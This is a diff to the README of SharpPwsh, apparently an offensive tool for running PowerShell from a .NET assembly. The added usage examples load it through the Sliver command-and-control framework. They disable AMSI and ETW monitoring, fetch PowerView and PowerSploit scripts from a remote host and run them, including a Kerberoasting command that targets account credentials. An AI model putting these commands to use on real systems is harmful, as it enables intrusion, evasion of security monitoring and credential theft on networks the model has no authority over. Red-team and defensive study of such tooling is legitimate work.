@@ -27,10 +27,16 @@ Copyright c  2022
 
 ```
 # execute powershell command
-sliver > execute-assembly -i /home/hacker/SharpPwsh.exe -c whoami
+.\SharpPwsh.exe -c whoami
 
 # load remote script and execute
-sliver > execute-assembly -i /home/hacker/SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
+.\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
+
+# sliver inline & bypass AMSI + ETW
+sliver > execute-assembly -M -E -i /tools/SharpPwsh.exe -c get-netlocalgroup -u http://x.x.x.x/psh/PowerSploit/Recon/PowerView.ps1
+
+# sliver BOF & bypass AMSI
+sliver > inline-execute-assembly /tools/SharpPwsh.exe '-b -c invoke-kerberoast -u http://x.x.x.x/PowerView.ps1'
 ```
 
 ## Planned
@@ -43,4 +49,4 @@ sliver > execute-assembly -i /home/hacker/SharpPwsh.exe -u http://x.x.x.x/PowerV
 ## Build
 Built using .NET Framework v4.5.1 in Visual Studio 2019.
 
-**Be sure to add `c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll` as a reference.**
+Be sure to add `c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll` as a reference.
